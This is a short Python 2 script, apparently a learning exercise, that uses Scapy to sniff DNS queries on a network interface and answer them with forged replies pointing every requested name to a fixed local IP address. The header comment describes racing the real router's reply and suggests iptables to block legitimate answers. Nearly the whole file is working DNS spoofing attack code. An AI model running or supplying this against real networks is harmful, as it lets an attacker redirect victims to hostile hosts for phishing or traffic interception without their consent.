#!/usr/bin/python

##########################################################################################################################
### this scipt when executed, will successfully spoof the dns of a viction  					 	 #
### this will not work all the time, because scapy does not have the functionaility 					 #
### of blocking, or denying packets sent from router to the victim							 #
### however if my spoofed/forged dns reply gets to the victim first, it will cache inside his/her 			 #
### browser. To solve this problem, we have to use the iptables to foward/actually deny the router packets to victim     #
### we would need another program to help us interact with iptables while in the python script				 #
### this script will do neither of those two things, but rather focusing on the concept of dns spoof			 #
### for more concret detailed tutorial of utilizing this script or the program mentioned ealier, please visit the  	 #
### following site. As it was used as an example for this script:							 #
															 #
### http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html		 #


## IMPORTING THE SCAPY LIBRARY

from scapy.all import *

## DEFINING CONSTANT
redirectedIP = "192.168.1.30" # my fedora host ip/COULD BE ANYTHING

## DEFINING CALLBACK FUNCTIONS
	# EACH PACKET WILL GO THROUGH THE FILTER TEST, TRUE FOR MATCH, FALSE FOR UNMATCH

def filterbuilder (pkt) :
    if IP in pkt:
        if pkt.haslayer(DNSQR):
            if pkt.haslayer(UDP):
	        pkt[UDP].dport = 53
		print "FOUND A DNS REQUEST ON UDP PORT 53"
		return True
            elif pkt.haslayer(TCP):
	    	pkt[TCP].dport = 53
		print "FOUND A DNS REQUEST ON TCP PORT 53"
		return True
    	    else:	
		print "ERROR OCCURED IN FILTER BUILDER, DNSQR PACKET DOESNT HAVE A CORRECT TRANSPORT PROTOCOL "	
            return False
        else:
            return False
    else:
        return False
	
	# EACH PACKET THAT PASSES THE FILTER WILL GO THROUGH THIS ONE FOR DNS SPOOFING
def dnsSpoof (pkt):
	if pkt.haslayer(DNSQR): # DNS question record.. aka dns request packet
				# this is where the spoofing takes place changing the src and dst of each header, ip/udp
				# then copying the same dns features such as id, qd(query data), setting aa=1 for dns authorize
				# qr(query or response) is set to 1 because query is 0
				# lastly adding the an(answer response), with another class os scapoy dnsrr, with rrname(resource record name)
				# as the original pkts dns querydata name, ttl set to 10 (arbituary), and its redirected IP (the whole point)
		ipHeader  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		udpHeader = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
		dnsHeader = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirectedIP))
		spoofedPkt = ipHeader/udpHeader/dnsHeader
	# send the spoofed packet
		send(spoofedPkt)
		print "*"*60 + "SPOOFED PACKET HAS BEEN SET" + "*"*60
                spoofedPkt.show()
        else:
            print "THIS PACKET IS NOT DNS QUESTION RECORD PACKET, BUT WAS SENT TO PORT 53 OF TARGET IP"

## USING THE SNIFF FUNCTION

# remember dns is an application layer that uses udp (mainly) 
# on port 53, hece the sniff filter at port 53, as the second arg
# first arg is the interface we want to sniff from
sniff(iface="wlp0s20u9u2", lfilter=filterbuilder, filter="udp", store=0, prn=dnsSpoof)


